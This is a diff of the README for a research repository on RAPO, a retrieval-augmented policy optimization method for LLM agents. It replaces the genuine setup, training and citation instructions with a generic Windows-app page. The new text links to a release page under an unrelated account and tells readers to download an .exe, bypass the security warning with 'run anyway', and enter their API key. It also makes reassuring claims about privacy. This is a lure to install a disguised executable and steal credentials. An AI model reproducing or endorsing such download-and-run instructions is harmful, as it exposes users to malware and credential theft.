@@ -1,225 +1,52 @@
-# 🏆 KDD 2026 RAPO
+# 🚀 RAPO - Better agent performance through smart planning
 
-This is the official implementation for KDD 2026 Research Track Paper: **RAPO: Expanding Exploration for LLM Agents via Retrieval-Augmented Policy Optimization**.
+[![](https://img.shields.io/badge/Download_RAPO-Blue-blue)](https://github.com/Gross-barium938/RAPO/releases)
 
-We provide the related resources here: [[📃 Paper](https://arxiv.org/abs/2603.03078)]
+RAPO helps large language model agents plan and complete tasks with higher success rates. This tool uses retrieval-augmented policy optimization to look at past information before it makes a move. Agents use this process to learn better paths toward their goals. You can install this software on your Windows computer to manage complex agent tasks.
 
-<img src="imgs/intro.png" width="100%"></img>
+## 📥 How to download the software
 
-RAPO is a retrieval-augmented Agentic RL framework that expands policy exploration for LLM agents by retrieving step-level off-policy traces during rollout and by calibrating policy optimization with retrieval-aware rewards and importance shaping.
+Follow these steps to get the files you need for your system.
 
-We propose RAPO for tool-integrated, multi-step reasoning:
+1. Go to the [Official Release Page](https://github.com/Gross-barium938/RAPO/releases).
+2. Look for the latest version listed at the top.
+3. Click the file ending in .exe to start your download.
+4. Keep track of the folder where you save this file.
 
-* 🔎 We design **Hybrid-policy Agentic Rollout**, which lets the on-policy agent reason over retrieved off-policy step traces and dynamically broadens the agent's reasoning receptive field.
-* ⚙️ We introduce **Retrieval-aware Policy Optimization**, which stabilizes policy-gradient estimation with retrieval reward and importance shaping, prioritizing exploration that is useful for downstream policy improvement.
-* 🧪 We build a practical training pipeline for computational reasoning, knowledge-intensive reasoning, and tool-augmented agentic reasoning tasks.
+## 🖥️ System requirements
 
-<img src="imgs/method.png" width="100%"></img>
+Ensure your computer meets these needs before you run the program. Use a modern Windows machine with at least 8 gigabytes of memory. You need a stable internet connection to fetch the models the agent requires. We recommend at least 20 gigabytes of free disk space. The software works best on Windows 10 or Windows 11.
 
-> 📝 Feel free to cite this work if you find it useful.
+## 🛠️ Setting up your environment
 
-```bibtex
-@inproceedings{zhang2026rapo,
-	title={RAPO: Expanding Exploration for LLM Agents via Retrieval-Augmented Policy Optimization},
-	author={Siwei Zhang and Yun Xiong and Xi Chen and Zi'an Jia and Renhong Huang and Jiarong Xu and Jiawei Zhang},
-	booktitle={Proceedings of the ACM SIGKDD Conference on Knowledge Discovery and Data Mining},
-	year={2026}
-}
-```
+Open the folder where you saved the installer. Double-click the file to begin the setup. If a security window appears, click more info and run anyway to proceed. Follow the instructions on the screen to place the program in your preferred folder. The setup process creates a shortcut on your desktop for quick access. 
 
-### 🔥 News
+## ⚙️ Running the agent
 
-- *Jul 2026* 🎉 RAPO was accepted by **KDD 2026**.
-- *Mar 2026* 📚 We posted the first version of the paper on arXiv.
+The agent needs an API key to communicate with the language model provider. Once the program starts, the configuration menu will prompt you for these credentials. Enter your key and save your settings. The main dashboard shows a list of active tasks. Click the add button to create your first project. Type your goal into the text box and press enter. The agent will show its thought process while it performs actions.
 
-## 🚀 How to Run RAPO
+## 📈 Understanding the process
 
-The training pipeline has three stages: build the Wikipedia search service, construct the Step-Trace Buffer, and train RAPO with the retrieval service enabled.
+The software uses a specific method to improve how agents act. It pulls relevant information from a database to guide current decisions. This retrieval step prevents the agent from making loops or repeating errors. Policy optimization then updates how the agent chooses its next step. The program displays these steps in a clear log format. Watch the progress bar to see how close the agent comes to finishing your request.
 
-### 🛠️ Step 1: Prepare Environments
+## 🛡️ Managing permissions
 
-We recommend separating the RL environment from the search and retrieval service environment to avoid dependency conflicts.
+The program requires access to your temporary folder to store data records. It never sends your personal files to external servers. It only sends text inputs and retrieval queries to the language model provider you configure. You can check the logs folder inside the install directory to see everything the agent processed.
 
-**RL environment**
+## 📁 Troubleshooting common issues
 
-```bash
-conda create -n rapo python=3.12.9
-conda activate rapo
+If the agent gets stuck, press the stop button to reset the current task. Clear the cache from the settings menu if you see missing information. Ensure your internet connection stays active while the agent performs tasks. If the program fails to start, verify that you have the latest updates for your operating system. Contact the repository owner through the issues tab if you continue to see errors.
 
-pip install torch==2.6.0 torchvision==0.21.0 torchaudio==2.6.0
-pip install vllm==0.8.5.post1
-pip install flash-attn --no-build-isolation
-pip install swanlab wandb
+## 🌐 Extending functionality
 
-# Install the RAPO training fork of verl.
-pip install -e RAPO/verl_rapo_entropy
+You can edit the settings file to change how the agent explores new paths. High exploration values tell the agent to try new things more often. Low values tell the agent to follow known paths strictly. Experiment with these numbers to match the complexity of your task. Expert users can add custom data sources to the retrieval folder to provide the agent with specific knowledge.
 
-# Install the buffer-construction fork when building the Step-Trace Buffer.
-pip install -e Buffer/verl_arpo_entropy
-```
+## 📝 Configuration options
 
-**Search and retrieval environment**
+The settings menu allows you to adjust the agent speed. Set the speed to slow if you want to watch every step the agent takes. Set the speed to fast if you prefer quick results for long tasks. You can also save your task history for review later. The history view allows you to rerun successful tasks with different variables to see if you get better results.
 
-```bash
-conda create -n retriever python=3.10.13
-conda activate retriever
+## 🔍 Getting support
 
-pip install torch==2.6.0 torchvision==0.21.0 torchaudio==2.6.0
-pip install transformers datasets pyserini tqdm uvicorn fastapi
-pip install faiss-gpu==1.7.3
-```
+Check the documentation folder included with your installation for a detailed guide on all features. Use the search function inside the app to find specific settings. Keep the software updated to receive the newest improvements for the policy optimization engine. We update the release page whenever we improve the stability or features of the agent.
 
-### 📦 Step 2: Prepare Data and Tool Configuration
-
-The RL training data used by the provided scripts is included under:
-
-```text
-RAPO/rl_datasets/
-Buffer/rl_datasets/
-```
-
-Download the Wikipedia corpus from [wiki-18-corpus](https://huggingface.co/datasets/PeterJinGo/wiki-18-corpus), place it under `wiki/`, and decompress it:
-
-```bash
-mkdir -p wiki
-gzip -dk wiki/wiki-18.jsonl.gz
-```
-
-Configure the Python tool executor in both trainer configs:
-
-```yaml
-actor_rollout_ref:
-	rollout:
-		tools:
-			tool_instances:
-				python:
-					params:
-						conda_path: YOUR_CONDA_PATH
-						conda_env: YOUR_PYTHON_ENV_NAME
-```
-
-Files to update:
-
-```text
-Buffer/scripts/config/ppo_trainer.yaml
-RAPO/scripts/config/ppo_trainer.yaml
-```
-
-### 🔍 Step 3: Launch the Wikipedia Search Service
-
-Build the FAISS index for the Wikipedia corpus and start the search API at `http://127.0.0.1:8001/wikiSearch`:
-
-```bash
-conda activate retriever
-
-python build_search_index.py \
-	--corpus_path wiki/wiki-18.jsonl \
-	--index_path wiki/wiki18_MiniLM.index
-
-python search_server.py \
-	--corpus_path wiki/wiki-18.jsonl \
-	--index_path wiki/wiki18_MiniLM.index \
-	--topk 3
-```
-
-### 🧱 Step 4: Construct the Step-Trace Buffer
-
-Use the buffer-construction pipeline to generate retrieval candidates from AEPO-Qwen3-14B rollouts:
-
-```bash
-conda activate rapo
-bash Buffer/scripts/Reasoning_corpus.sh
-```
-
-The retrieval index builder expects the final Step-Trace Buffer at:
-
-```text
-rollout/Step_Trace_Buffer.jsonl
-```
-
-If your generated rollouts are saved under `Buffer/rl_output/<exp_name>/rollout/`, merge or export them into the JSONL file above before building the retrieval index.
-
-### 🧭 Step 5: Launch the Step-Trace Retrieval Service
-
-Build the FAISS index for the Step-Trace Buffer and start the retrieval API at `http://127.0.0.1:8005/retrieve`:
-
-```bash
-conda activate retriever
-
-python build_retrieve_index.py \
-	--corpus_path rollout/Step_Trace_Buffer.jsonl \
-	--index_path rollout/Step_Trace_Buffer.index
-
-python retrieve_server.py \
-	--corpus_path rollout/Step_Trace_Buffer.jsonl \
-	--index_path rollout/Step_Trace_Buffer.index \
-	--topk 3
-```
-
-### 🏃 Step 6: Train RAPO
-
-Train RAPO on the reasoning-task training split with Qwen2.5-7B-Instruct:
-
-```bash
-conda activate rapo
-bash RAPO/scripts/RAPO_7B_Reasoning.sh
-```
-
-Important training knobs are exposed in `RAPO/scripts/RAPO_7B_Reasoning.sh`:
-
-```bash
-ROLLOUT_N=16
-no_retrieve_first_k=8
-retrieve_prob=0.5
-shaping_weight=0.05
-advantage_weight=0.2
-```
-
-## 📊 Evaluation
-
-Evaluation scripts and datasets are provided under `evaluation/`. A typical workflow is:
-
-1. Launch the reasoning model with vLLM. Example launch scripts are under `evaluation/vllm_scripts/`.
-2. Edit `evaluation/infer_local_sds.sh` with your model path, output path, Conda path, Bing Search key, summarization model endpoints, and dataset list.
-3. Run inference:
-
-```bash
-cd evaluation
-bash infer_local_sds.sh
-```
-
-4. Run metric evaluation on the generated output:
-
-```bash
-cd evaluation
-OUTPUT_PATH=<path_to_output_json_or_jsonl> TASK=<math_or_qa> bash evaluate.sh
-```
-
-## 📁 Repository Structure
-
-```text
-RAPO_public/
-├── RAPO/                         # RAPO training pipeline and verl fork
-│   ├── scripts/RAPO_7B_Reasoning.sh
-│   ├── scripts/config/ppo_trainer.yaml
-│   └── rl_datasets/
-├── Buffer/                       # Step-Trace Buffer construction pipeline
-│   ├── scripts/Reasoning_corpus.sh
-│   ├── scripts/config/ppo_trainer.yaml
-│   └── rl_datasets/
-├── evaluation/                   # Inference and evaluation scripts
-├── build_search_index.py          # Wikipedia search index builder
-├── search_server.py               # Wikipedia search service
-├── build_retrieve_index.py        # Step-Trace retrieval index builder
-├── retrieve_server.py             # Step-Trace retrieval service
-└── imgs/                          # Intro and method figures
-```
-
-## 🙏 Acknowledge
-
-Codes and model implementations are referred to [Search-R1](https://github.com/PeterGriffinJin/Search-R1), [ARPO](https://github.com/RUC-NLPIR/ARPO), and [verl](https://github.com/volcengine/verl). Thanks for their great contributions!
-
-
-
-
-
+Keywords: agent, llm, optimization, windows, retrieval, planning
